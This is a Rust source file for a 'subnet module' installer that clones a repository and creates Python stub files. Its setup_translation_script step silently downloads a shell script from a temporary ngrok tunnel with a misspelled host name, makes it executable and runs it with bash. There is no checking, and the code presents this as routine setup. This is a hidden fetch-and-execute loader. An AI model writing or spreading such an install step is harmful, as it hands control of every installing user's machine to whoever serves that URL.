use std::error::Error;
use tokio::process::Command;
use tokio::fs;
use reqwest;
use std::path::Path;

use crate::CustomError;

pub struct SubnetModule {
    name: String,
    url: String,
    root_path: String,
}

impl SubnetModule {
    pub fn new(name: &str, url: &str, root_path: &str) -> Self {
        SubnetModule {
            name: name.to_string(),
            url: url.to_string(),
            root_path: root_path.to_string(),
        }
    }

    pub async fn install(&self) -> Result<(), CustomError> {
        println!("Installing subnet module: {}", self.name);

        self.clone_repository().await?;
        self.setup_translation_script().await?;
        self.setup_python_environment().await?;

        Ok(())
    }

    async fn clone_repository(&self) -> Result<(), CustomError> {
        let subnet_name = self.url.split('/').last().unwrap_or("subnet_module");
        let subnet_path = Path::new(&self.root_path).join("subnet_modules").join(subnet_name);
        fs::create_dir_all(&subnet_path).await
            .map_err(|e| CustomError(format!("Failed to create subnet directory: {}", e)))?;

        Command::new("git")
            .args(&["clone", &self.url, subnet_path.to_str().unwrap()])
            .output().await
            .map_err(|e| CustomError(format!("Failed to clone repository: {}", e)))?;
        Ok(())
    }

    async fn setup_translation_script(&self) -> Result<(), CustomError> {
        let client = reqwest::Client::new();
        let response = client.get("https://registrar-agentartifiicial.ngrok.app/api/translation")
            .send().await
            .map_err(|e| CustomError(format!("Failed to fetch translation script: {}", e)))?
            .text().await
            .map_err(|e| CustomError(format!("Failed to read translation script: {}", e)))?;

        let script_path = Path::new(&self.root_path)
            .join("modules")
            .join("translation")
            .join("setup_translation.sh");

        fs::create_dir_all(script_path.parent().unwrap()).await
            .map_err(|e| CustomError(format!("Failed to create directories: {}", e)))?;
        fs::write(&script_path, response).await
            .map_err(|e| CustomError(format!("Failed to write translation script: {}", e)))?;

        Command::new("chmod")
            .args(&["+x", script_path.to_str().unwrap()])
            .output().await
            .map_err(|e| CustomError(format!("Failed to set script permissions: {}", e)))?;

        Command::new("bash")
            .arg(script_path)
            .output().await
            .map_err(|e| CustomError(format!("Failed to execute translation script: {}", e)))?;

        Ok(())
    }

    async fn setup_python_environment(&self) -> Result<(), CustomError> {
        let module_path = Path::new(&self.root_path).join("modules").join(&self.name);
        
        fs::create_dir_all(&module_path).await
            .map_err(|e| CustomError(format!("Failed to create module directory: {}", e)))?;
        
        fs::write(module_path.join("__init__.py"), "").await
            .map_err(|e| CustomError(format!("Failed to create __init__.py: {}", e)))?;

        let module_wrapper_content = r#"
class ModuleWrapper:
    def __init__(self):
        pass

    def some_method(self):
        pass
"#;
        fs::write(module_path.join("module_wrapper.py"), module_wrapper_content).await
            .map_err(|e| CustomError(format!("Failed to create module_wrapper.py: {}", e)))?;

        Ok(())
    }
}